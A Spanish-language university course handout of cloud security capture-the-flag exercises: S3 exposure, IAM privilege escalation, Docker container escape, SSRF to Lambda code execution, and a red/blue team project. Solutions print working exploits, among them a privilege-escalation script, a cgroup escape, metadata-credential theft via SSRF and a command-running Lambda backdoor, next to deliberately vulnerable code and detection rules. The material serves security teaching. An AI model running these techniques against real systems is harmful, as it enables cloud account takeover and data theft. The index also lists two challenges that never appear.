# EJERCICIOS AVANZADOS Y CHALLENGES
## Clase 7 - Seguridad en la Nube y Virtualización

---

## ÍNDICE

1. [Challenge 1: The Leaky Bucket](#challenge-1-the-leaky-bucket)
2. [Challenge 2: Privilege Escalation](#challenge-2-privilege-escalation)
3. [Challenge 3: Container Escape](#challenge-3-container-escape)
4. [Challenge 4: SSRF to RCE](#challenge-4-ssrf-to-rce)
5. [Challenge 5: Kubernetes Pwn](#challenge-5-kubernetes-pwn)
6. [Challenge 6: AWS Lambda Exploitation](#challenge-6-aws-lambda-exploitation)
7. [Proyecto Final: Red Team vs Blue Team](#proyecto-final-red-team-vs-blue-team)

---

## CHALLENGE 1: THE LEAKY BUCKET

### Nivel: Intermedio
### Tiempo estimado: 60 minutos
### Puntos: 100

### Objetivo
Encontrar y exfiltrar la flag oculta en un bucket S3 mal configurado utilizando múltiples técnicas de enumeración y explotación.

### Descripción del Escenario

Has sido contratado para realizar una auditoría de seguridad de la infraestructura cloud de la empresa "SecureApp Inc". Tu punto de partida es una URL de aplicación web:

```
https://secureapp-demo.s3.amazonaws.com/index.html
```

**Tu misión:**
1. Identificar configuraciones inseguras
2. Enumerar contenido del bucket
3. Encontrar la flag: `FLAG{...}`

### Setup del Challenge

```bash
# Crear el entorno vulnerable (instructor)
#!/bin/bash

BUCKET_NAME="secureapp-demo-$(date +%s)"

# Crear bucket
aws s3 mb s3://${BUCKET_NAME}

# Hacer público (VULNERABILIDAD)
aws s3api put-bucket-acl --bucket ${BUCKET_NAME} --acl public-read

# Subir archivos
cat > index.html << 'EOF'
<!DOCTYPE html>
<html>
<head>
    <title>SecureApp Inc</title>
</head>
<body>
    <h1>Welcome to SecureApp</h1>
    <p>Our cloud infrastructure is 100% secure!</p>
    <!-- TODO: Remove backup files from production -->
</body>
</html>
EOF

# Archivos "ocultos"
echo "admin:$2y$10\$examplehashedpassword" > .htpasswd
echo "AWS_ACCESS_KEY=AKIAIOSFODNN7EXAMPLE" > .env.backup
echo "FLAG{m15c0nf1gur3d_buck3t_1s_bad}" > flag.txt
echo "Database backup from 2024-01-15" > database_backup.sql
cat > credentials.json << 'EOF'
{
  "api_key": "sk-1234567890abcdef",
  "database": {
    "host": "prod-db.rds.amazonaws.com",
    "user": "admin",
    "pass": "SuperSecret123!"
  }
}
EOF

# Subir todo
aws s3 sync . s3://${BUCKET_NAME}/ --exclude ".git/*"

# Configurar website
aws s3 website s3://${BUCKET_NAME}/ --index-document index.html

echo "Challenge deployed at: http://${BUCKET_NAME}.s3-website-us-east-1.amazonaws.com"
```

### Hints

<details>
<summary>Hint 1 (Clic para ver)</summary>

Los buckets S3 permiten listar contenido si están configurados como públicos. Prueba usar el AWS CLI o curl para enumerar archivos.

</details>

<details>
<summary>Hint 2 (Clic para ver)</summary>

Los archivos que comienzan con `.` (punto) suelen contener información sensible y a veces no están listados en el website pero sí accesibles directamente.

</details>

<details>
<summary>Hint 3 (Clic para ver)</summary>

Intenta listar el bucket:
```bash
aws s3 ls s3://secureapp-demo/ --no-sign-request
```

</details>

### Solución Paso a Paso

<details>
<summary>Ver solución completa</summary>

**Paso 1: Identificar el bucket**
```bash
# Desde la URL, extraer nombre del bucket
# https://secureapp-demo.s3.amazonaws.com/index.html
# Bucket: secureapp-demo
```

**Paso 2: Intentar listar contenido**
```bash
# Sin credenciales (público)
aws s3 ls s3://secureapp-demo/ --no-sign-request

# Salida esperada:
# 2024-01-15 10:30:00       1024 .env.backup
# 2024-01-15 10:30:00        256 .htpasswd
# 2024-01-15 10:30:00       1536 credentials.json
# 2024-01-15 10:30:00        512 database_backup.sql
# 2024-01-15 10:30:00         39 flag.txt
# 2024-01-15 10:30:00       2048 index.html
```

**Paso 3: Descargar flag**
```bash
# Método 1: AWS CLI
aws s3 cp s3://secureapp-demo/flag.txt . --no-sign-request

# Método 2: curl
curl https://secureapp-demo.s3.amazonaws.com/flag.txt

# Método 3: wget
wget https://secureapp-demo.s3.amazonaws.com/flag.txt

cat flag.txt
# FLAG{m15c0nf1gur3d_buck3t_1s_bad}
```

**Paso 4: Análisis adicional**
```bash
# Descargar todos los archivos sensibles
aws s3 sync s3://secureapp-demo/ ./loot/ --no-sign-request

# Analizar credenciales encontradas
cat loot/credentials.json
cat loot/.env.backup

# Reportar en informe:
# - Bucket público con ACL mal configurada
# - Credenciales expuestas
# - Backups de base de datos accesibles
# - Archivos de configuración sensibles
```

</details>

### Preguntas de Reflexión

1. ¿Qué configuración específica permitió este ataque?
2. ¿Cómo deberían haberse almacenado las credenciales?
3. ¿Qué controles de AWS prevendrían esta exposición?
4. ¿Cómo detectarías este tipo de configuración en tu organización?

### Remediación

Documenta los pasos para asegurar el bucket:

```bash
# 1. Eliminar ACL pública
aws s3api put-bucket-acl --bucket secureapp-demo --acl private

# 2. Habilitar Block Public Access
aws s3api put-public-access-block \
  --bucket secureapp-demo \
  --public-access-block-configuration \
    BlockPublicAcls=true,IgnorePublicAcls=true,BlockPublicPolicy=true,RestrictPublicBuckets=true

# 3. Eliminar archivos sensibles
aws s3 rm s3://secureapp-demo/credentials.json
aws s3 rm s3://secureapp-demo/.env.backup
aws s3 rm s3://secureapp-demo/.htpasswd

# 4. Habilitar cifrado
aws s3api put-bucket-encryption \
  --bucket secureapp-demo \
  --server-side-encryption-configuration \
    '{"Rules":[{"ApplyServerSideEncryptionByDefault":{"SSEAlgorithm":"AES256"}}]}'

# 5. Habilitar versionado
aws s3api put-bucket-versioning \
  --bucket secureapp-demo \
  --versioning-configuration Status=Enabled

# 6. Habilitar logging
aws s3api put-bucket-logging \
  --bucket secureapp-demo \
  --bucket-logging-status \
    '{"LoggingEnabled":{"TargetBucket":"secureapp-logs","TargetPrefix":"access-logs/"}}'
```

---

## CHALLENGE 2: PRIVILEGE ESCALATION

### Nivel: Avanzado
### Tiempo estimado: 90 minutos
### Puntos: 200

### Objetivo
Escalar privilegios desde un usuario IAM con permisos limitados hasta obtener acceso administrativo.

### Descripción del Escenario

Se te han proporcionado credenciales de un usuario IAM de bajo privilegio:

```
AWS_ACCESS_KEY_ID=AKIAEXAMPLELOW PRIV
AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYLOWPRIV
```

Este usuario aparentemente solo tiene permisos de lectura básicos. Sin embargo, existe una configuración incorrecta que permite escalar privilegios.

**Tu misión:**
1. Enumerar permisos actuales
2. Identificar vectores de escalada
3. Obtener credenciales de administrador
4. Encontrar la flag en un bucket privado

### Setup del Challenge

```python
#!/usr/bin/env python3
"""
Script para crear el entorno del challenge
"""

import boto3
import json

def setup_challenge():
    iam = boto3.client('iam')

    # Crear usuario de bajo privilegio
    lowpriv_user = iam.create_user(UserName='lowpriv-user')

    # Crear política que parece inofensiva pero permite escalada
    escalation_policy = {
        "Version": "2012-10-17",
        "Statement": [
            {
                "Effect": "Allow",
                "Action": [
                    "iam:GetUser",
                    "iam:ListUsers",
                    "iam:ListUserPolicies",
                    "iam:ListAttachedUserPolicies",
                    "iam:GetPolicy",
                    "iam:GetPolicyVersion"
                ],
                "Resource": "*"
            },
            {
                "Effect": "Allow",
                "Action": [
                    "iam:PutUserPolicy"  # VULNERABILIDAD
                ],
                "Resource": "arn:aws:iam::*:user/${aws:username}"
            },
            {
                "Effect": "Allow",
                "Action": [
                    "lambda:GetFunction",
                    "lambda:ListFunctions"
                ],
                "Resource": "*"
            }
        ]
    }

    # Crear y adjuntar política
    policy = iam.create_policy(
        PolicyName='LowPrivEscalation',
        PolicyDocument=json.dumps(escalation_policy)
    )

    iam.attach_user_policy(
        UserName='lowpriv-user',
        PolicyArn=policy['Policy']['Arn']
    )

    # Crear clave de acceso
    credentials = iam.create_access_key(UserName='lowpriv-user')

    # Crear Lambda con credenciales admin (objetivo del ataque)
    lambda_client = boto3.client('lambda')

    lambda_code = '''
import json

def lambda_handler(event, context):
    # FLAG oculta
    flag = "FLAG{1am_35cal4t10n_thr0ugh_p0l1cy}"
    return {
        'statusCode': 200,
        'body': json.dumps(f'Secret flag: {flag}')
    }
'''

    # Crear función lambda
    # (código simplificado, en realidad necesitaría crear deployment package)

    print("Challenge configurado!")
    print(f"Access Key: {credentials['AccessKey']['AccessKeyId']}")
    print(f"Secret Key: {credentials['AccessKey']['SecretAccessKey']}")

if __name__ == '__main__':
    setup_challenge()
```

### Solución

<details>
<summary>Ver solución completa</summary>

**Paso 1: Enumerar permisos actuales**

```bash
# Verificar identidad
aws sts get-caller-identity

# Listar políticas del usuario
aws iam list-user-policies --user-name lowpriv-user
aws iam list-attached-user-policies --user-name lowpriv-user

# Obtener política
POLICY_ARN=$(aws iam list-attached-user-policies --user-name lowpriv-user --query 'AttachedPolicies[0].PolicyArn' --output text)

aws iam get-policy --policy-arn $POLICY_ARN
aws iam get-policy-version --policy-arn $POLICY_ARN --version-id v1
```

**Paso 2: Identificar vector de escalada**

```python
#!/usr/bin/env python3
"""
Analiza permisos para encontrar vectores de escalada
"""

import boto3
import json

def analyze_permissions():
    iam = boto3.client('iam')

    # Obtener usuario actual
    user = iam.get_user()
    username = user['User']['UserName']

    print(f"[*] Analizando permisos para: {username}")

    # Listar políticas
    attached_policies = iam.list_attached_user_policies(UserName=username)

    for policy in attached_policies['AttachedPolicies']:
        policy_arn = policy['PolicyArn']
        policy_details = iam.get_policy(PolicyArn=policy_arn)
        version = policy_details['Policy']['DefaultVersionId']

        policy_doc = iam.get_policy_version(
            PolicyArn=policy_arn,
            VersionId=version
        )

        statements = policy_doc['PolicyVersion']['Document']['Statement']

        for stmt in statements:
            actions = stmt.get('Action', [])

            # Buscar permisos peligrosos
            dangerous_perms = [
                'iam:PutUserPolicy',
                'iam:AttachUserPolicy',
                'iam:CreateAccessKey',
                'iam:UpdateAssumeRolePolicy',
                'iam:PassRole',
                'lambda:UpdateFunctionCode'
            ]

            for perm in dangerous_perms:
                if perm in actions or '*' in actions:
                    print(f"\n[!] Permiso peligroso encontrado: {perm}")
                    print(f"    Resource: {stmt.get('Resource')}")
                    print(f"    Condition: {stmt.get('Condition', 'None')}")

                    if perm == 'iam:PutUserPolicy':
                        print("\n[+] VECTOR DE ESCALADA ENCONTRADO!")
                        print("    Puedes adjuntarte una política inline con permisos de admin")

if __name__ == '__main__':
    analyze_permissions()
```

**Paso 3: Explotar iam:PutUserPolicy**

```python
#!/usr/bin/env python3
"""
Exploit para escalar privilegios
"""

import boto3
import json

def escalate_privileges():
    iam = boto3.client('iam')

    # Obtener usuario actual
    user = iam.get_user()
    username = user['User']['UserName']

    print(f"[*] Escalando privilegios para: {username}")

    # Crear política inline con permisos de admin
    admin_policy = {
        "Version": "2012-10-17",
        "Statement": [
            {
                "Effect": "Allow",
                "Action": "*",
                "Resource": "*"
            }
        ]
    }

    # Adjuntar política inline
    iam.put_user_policy(
        UserName=username,
        PolicyName='EscalatedAdminPolicy',
        PolicyDocument=json.dumps(admin_policy)
    )

    print("[+] Política de administrador adjuntada exitosamente!")
    print("[+] Ahora tienes permisos completos de AWS")

    # Verificar
    print("\n[*] Verificando nuevos permisos...")
    policies = iam.list_user_policies(UserName=username)
    print(f"[+] Políticas inline: {policies['PolicyNames']}")

    return True

if __name__ == '__main__':
    escalate_privileges()
```

**Paso 4: Acceder a recursos restringidos**

```bash
# Ahora con permisos de admin, buscar la flag

# Listar todos los buckets
aws s3 ls

# Buscar buckets con "flag" o "secret"
aws s3 ls | grep -E "(flag|secret|admin)"

# Listar funciones Lambda
aws lambda list-functions

# Obtener código de función Lambda sospechosa
aws lambda get-function --function-name secret-flag-function

# Invocar Lambda para obtener flag
aws lambda invoke \
  --function-name secret-flag-function \
  --payload '{}' \
  output.json

cat output.json
# {"statusCode": 200, "body": "\"Secret flag: FLAG{1am_35cal4t10n_thr0ugh_p0l1cy}\""}
```

</details>

### Preguntas de Reflexión

1. ¿Por qué `iam:PutUserPolicy` con `Resource: ${aws:username}` es peligroso?
2. ¿Qué otros permisos de IAM pueden llevar a escalación?
3. ¿Cómo detectarías este tipo de escalación en tiempo real?
4. ¿Qué política de IAM prevendría este ataque?

---

## CHALLENGE 3: CONTAINER ESCAPE

### Nivel: Experto
### Tiempo estimado: 120 minutos
### Puntos: 300

### Objetivo
Escapar de un contenedor Docker privilegiado y obtener acceso al host subyacente.

### Descripción del Escenario

Te has conectado a un contenedor Docker que está ejecutándose con configuraciones inseguras. Tu objetivo es escapar del contenedor y acceder al filesystem del host.

```bash
# Conectado al contenedor
docker run -it --privileged --pid=host --net=host ubuntu:latest /bin/bash
```

**Señales de que el contenedor es privilegiado:**
- Modo `--privileged` habilitado
- Acceso a dispositivos del host (`/dev`)
- Capabilities extendidas

### Setup

```bash
# Crear contenedor vulnerable
docker run -d \
  --name vulnerable-container \
  --privileged \
  --pid=host \
  --net=host \
  -v /:/host \
  ubuntu:latest \
  sleep infinity

# Entrar al contenedor
docker exec -it vulnerable-container /bin/bash
```

### Técnicas de Escape

<details>
<summary>Ver técnicas de escape</summary>

#### Técnica 1: Mount Host Filesystem

```bash
# Dentro del contenedor privilegiado

# Listar dispositivos
ls -la /dev/ | grep sd

# Identificar disco del host (generalmente /dev/sda1 o /dev/xvda1)
fdisk -l

# Montar filesystem del host
mkdir /mnt/host
mount /dev/sda1 /mnt/host

# Acceder a filesystem completo del host
ls -la /mnt/host/root/
cat /mnt/host/etc/shadow

# FLAG
cat /mnt/host/root/flag.txt
```

#### Técnica 2: Abuso de Cgroups

```bash
# Crear cgroup de notificación
mkdir /tmp/exploit
mount -t cgroup -o memory cgroup /tmp/exploit

# Habilitar notificaciones
echo 1 > /tmp/exploit/notify_on_release

# Escribir script malicioso
cat > /cmd << EOF
#!/bin/sh
cat /root/flag.txt > /tmp/flag_output
EOF

chmod +x /cmd

# Obtener path del contenedor en el host
host_path=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab | head -n1)

# Configurar release agent
echo "$host_path/cmd" > /tmp/exploit/release_agent

# Crear proceso en cgroup que terminará inmediatamente
sh -c "echo \$\$ > /tmp/exploit/cgroup.procs"

# El release_agent ejecutará nuestro script en el host
sleep 1
cat /tmp/flag_output
```

#### Técnica 3: Namespace Escape con nsenter

```bash
# Si el contenedor tiene acceso a PID namespace del host

# Listar procesos del host
ps aux

# Encontrar PID 1 (init del host)
# Usar nsenter para ejecutar comando en namespace del host
nsenter --target 1 --mount --uts --ipc --net --pid -- bash

# Ahora estamos en el host!
hostname  # Debería ser el hostname del host, no del contenedor
cat /root/flag.txt
```

#### Técnica 4: Docker Socket Exposure

```bash
# Si el socket de Docker está montado dentro del contenedor
# -v /var/run/docker.sock:/var/run/docker.sock

# Instalar cliente Docker dentro del contenedor
apt-get update && apt-get install -y docker.io

# Crear nuevo contenedor montando root del host
docker run -v /:/hostfs -it ubuntu chroot /hostfs bash

# Acceso completo al host
cat /root/flag.txt
```

</details>

### Detección y Prevención

<details>
<summary>Ver controles de seguridad</summary>

#### AppArmor/SELinux Profile

```bash
# Perfil de AppArmor para contenedor
# /etc/apparmor.d/docker-default

#include <tunables/global>

profile docker-default flags=(attach_disconnected,mediate_deleted) {
  #include <abstractions/base>

  # Denegar acceso a archivos sensibles del host
  deny /proc/** w,
  deny /sys/** w,
  deny /root/** rw,

  # Denegar montajes
  deny mount,
  deny umount,

  # Denegar capabilities peligrosas
  deny capability sys_admin,
  deny capability sys_module,
}
```

#### Kubernetes Pod Security Policy

```yaml
apiVersion: policy/v1beta1
kind: PodSecurityPolicy
metadata:
  name: restricted
spec:
  privileged: false  # NO permitir modo privilegiado
  allowPrivilegeEscalation: false
  requiredDropCapabilities:
    - ALL
  volumes:
    - 'configMap'
    - 'emptyDir'
    - 'projected'
    - 'secret'
    - 'downwardAPI'
    - 'persistentVolumeClaim'
  hostNetwork: false
  hostIPC: false
  hostPID: false
  runAsUser:
    rule: 'MustRunAsNonRoot'
  seLinux:
    rule: 'RunAsAny'
  fsGroup:
    rule: 'RunAsAny'
  readOnlyRootFilesystem: true
```

#### Runtime Security con Falco

```yaml
# /etc/falco/falco_rules.local.yaml

- rule: Container Escape Attempt
  desc: Detect attempt to escape from container
  condition: >
    spawned_process and
    container and
    (proc.name in (nsenter, docker, mount) or
     proc.cmdline contains "nsenter" or
     proc.cmdline contains "/host" or
     proc.cmdline contains "cgroup")
  output: >
    Potential container escape attempt
    (user=%user.name command=%proc.cmdline
    container=%container.name image=%container.image)
  priority: CRITICAL
  tags: [container, escape, mitre_ta0004]

- rule: Privileged Container Launched
  desc: Detect launch of privileged container
  condition: >
    container_started and
    container.privileged=true
  output: >
    Privileged container launched
    (user=%user.name image=%container.image)
  priority: WARNING
  tags: [container, privileged]
```

</details>

---

## CHALLENGE 4: SSRF TO RCE

### Nivel: Experto
### Tiempo estimado: 90 minutos
### Puntos: 250

### Objetivo
Explotar una vulnerabilidad SSRF en una aplicación web para lograr Remote Code Execution en la instancia EC2.

### Aplicación Vulnerable

```python
#!/usr/bin/env python3
"""
Aplicación web vulnerable a SSRF
"""

from flask import Flask, request, jsonify
import requests

app = Flask(__name__)

@app.route('/fetch')
def fetch_url():
    """
    Endpoint vulnerable que permite hacer requests a URLs arbitrarias
    """
    url = request.args.get('url')

    if not url:
        return jsonify({"error": "URL parameter required"}), 400

    # VULNERABLE: No hay validación de la URL
    try:
        response = requests.get(url, timeout=5)
        return jsonify({
            "status": response.status_code,
            "content": response.text
        })
    except Exception as e:
        return jsonify({"error": str(e)}), 500

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8080)
```

### Exploit Path

<details>
<summary>Ver exploit completo</summary>

**Paso 1: Verificar SSRF**

```bash
# Probar acceso a metadata service
curl 'http://vulnerable-app.com/fetch?url=http://169.254.169.254/latest/meta-data/'

# Respuesta esperada: listado de endpoints de metadata
```

**Paso 2: Enumerar IAM Role**

```bash
# Obtener nombre del rol
curl 'http://vulnerable-app.com/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/'

# Respuesta: WebServerRole

# Obtener credenciales
curl 'http://vulnerable-app.com/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/WebServerRole'
```

**Paso 3: Usar credenciales para exploración**

```python
import boto3
import json

# Credenciales obtenidas via SSRF
credentials = {
    "AccessKeyId": "ASIA...",
    "SecretAccessKey": "...",
    "Token": "..."
}

# Crear cliente S3
s3 = boto3.client(
    's3',
    aws_access_key_id=credentials['AccessKeyId'],
    aws_secret_access_key=credentials['SecretAccessKey'],
    aws_session_token=credentials['Token']
)

# Listar buckets
buckets = s3.list_buckets()
print(f"Buckets accesibles: {len(buckets['Buckets'])}")

# Buscar datos sensibles
for bucket in buckets['Buckets']:
    print(f"\nBucket: {bucket['Name']}")
    try:
        objects = s3.list_objects_v2(Bucket=bucket['Name'])
        if 'Contents' in objects:
            for obj in objects['Contents']:
                if 'secret' in obj['Key'] or 'flag' in obj['Key']:
                    print(f"  [!] Archivo interesante: {obj['Key']}")
    except:
        pass
```

**Paso 4: Escalar a RCE**

```bash
# Si el rol tiene permisos de Lambda

# Listar funciones
aws lambda list-functions \
  --aws-access-key-id $ACCESS_KEY \
  --aws-secret-access-key $SECRET_KEY \
  --aws-session-token $TOKEN

# Actualizar código de función Lambda existente
cat > lambda_backdoor.py << 'EOF'
import subprocess

def lambda_handler(event, context):
    command = event.get('command', 'whoami')
    result = subprocess.check_output(command, shell=True)
    return {
        'statusCode': 200,
        'body': result.decode('utf-8')
    }
EOF

zip function.zip lambda_backdoor.py

# Actualizar función
aws lambda update-function-code \
  --function-name target-function \
  --zip-file fileb://function.zip

# Invocar con comando
aws lambda invoke \
  --function-name target-function \
  --payload '{"command":"cat /var/task/flag.txt"}' \
  output.json

cat output.json
```

</details>

---

## PROYECTO FINAL: RED TEAM VS BLUE TEAM

### Duración: 4 horas
### Equipos: 2-4 personas por equipo

### Objetivo

Simular un escenario real de ataque y defensa en infraestructura cloud.

### Roles

**Red Team:**
- Objetivo: Comprometer la infraestructura
- Objetivos secundarios: Exfiltrar datos, mantener persistencia

**Blue Team:**
- Objetivo: Detectar y responder a ataques
- Objetivos secundarios: Implementar controles, remediar vulnerabilidades

### Infraestructura

```yaml
# Infraestructura vulnerable (Terraform)
provider "aws" {
  region = "us-east-1"
}

# VPC con configuración insegura
resource "aws_vpc" "vulnerable" {
  cidr_block = "10.0.0.0/16"

  tags = {
    Name = "Vulnerable-VPC"
  }
}

# Security Group permisivo
resource "aws_security_group" "web" {
  name        = "web-sg"
  description = "Permissive security group"
  vpc_id      = aws_vpc.vulnerable.id

  ingress {
    from_port   = 0
    to_port     = 65535
    protocol    = "tcp"
    cidr_blocks = ["0.0.0.0/0"]  # VULNERABLE
  }

  egress {
    from_port   = 0
    to_port     = 0
    protocol    = "-1"
    cidr_blocks = ["0.0.0.0/0"]
  }
}

# EC2 con aplicación vulnerable
resource "aws_instance" "web" {
  ami           = "ami-0c55b159cbfafe1f0"
  instance_type = "t2.micro"

  vpc_security_group_ids = [aws_security_group.web.id]

  user_data = <<-EOF
              #!/bin/bash
              apt-get update
              apt-get install -y python3-pip
              pip3 install flask requests
              # Deploy vulnerable app
              EOF

  iam_instance_profile = aws_iam_instance_profile.web_profile.name

  tags = {
    Name = "Vulnerable-Web-Server"
  }
}

# Bucket S3 con datos sensibles
resource "aws_s3_bucket" "sensitive_data" {
  bucket = "company-sensitive-data-${random_id.bucket_id.hex}"

  tags = {
    Name        = "Sensitive Data"
    Environment = "Production"
  }
}

# Configuración insegura del bucket
resource "aws_s3_bucket_acl" "sensitive_data_acl" {
  bucket = aws_s3_bucket.sensitive_data.id
  acl    = "public-read"  # VULNERABLE
}

# Lambda con secretos
resource "aws_lambda_function" "admin_function" {
  filename      = "lambda_function.zip"
  function_name = "admin-operations"
  role          = aws_iam_role.lambda_role.arn
  handler       = "index.handler"
  runtime       = "python3.9"

  environment {
    variables = {
      DB_PASSWORD = "SuperSecretPassword123!"  # VULNERABLE
      API_KEY     = "sk-1234567890abcdef"
    }
  }
}
```

### Scoring

**Red Team:**
| Objetivo | Puntos |
|----------|--------|
| Identificar bucket público | 50 |
| Exfiltrar datos de S3 | 100 |
| Obtener credenciales IAM | 150 |
| Acceso a instancia EC2 | 200 |
| Persistencia establecida | 250 |
| Flag final capturada | 300 |

**Blue Team:**
| Objetivo | Puntos |
|----------|--------|
| Detectar escaneo de red | 50 |
| Bloquear intento de acceso | 100 |
| Identificar SSRF | 150 |
| Remediar bucket público | 200 |
| Implementar alertas | 250 |
| Respuesta completa a incidente | 300 |

### Entregables

1. **Red Team:**
   - Informe de penetración testing
   - Lista de vulnerabilidades encontradas
   - Evidencia de explotación (capturas)
   - Recomendaciones de remediación

2. **Blue Team:**
   - Logs de detección
   - Alertas configuradas
   - Controles implementados
   - Playbook de respuesta a incidentes
   - Post-mortem del ataque

---

## RECURSOS ADICIONALES

### Herramientas Recomendadas

```bash
# Instalación de herramientas

# ScoutSuite - Auditoría multi-cloud
pip install scoutsuite
scout aws --profile your-profile

# Pacu - Framework de explotación AWS
git clone https://github.com/RhinoSecurityLabs/pacu.git
cd pacu && pip install -r requirements.txt

# Prowler - AWS security assessment
git clone https://github.com/prowler-cloud/prowler
cd prowler && pip install -r requirements.txt
./prowler -M csv

# WeirdAAL - AWS exploitation
git clone https://github.com/carnal0wnage/weirdAAL.git
cd weirdAAL && pip install -r requirements.txt

# CloudMapper - Visualización de infraestructura
git clone https://github.com/duo-labs/cloudmapper.git
cd cloudmapper && pip install -r requirements.txt
```

### Laboratorios Online

- **flAWS** - http://flaws.cloud/
- **flAWS2** - http://flaws2.cloud/
- **CloudGoat** - https://github.com/RhinoSecurityLabs/cloudgoat
- **Serverless Goat** - https://github.com/OWASP/Serverless-Goat
- **Kubernetes Goat** - https://github.com/madhuakula/kubernetes-goat

---

© 2025 – UTN | Laboratorio de Ciberseguridad
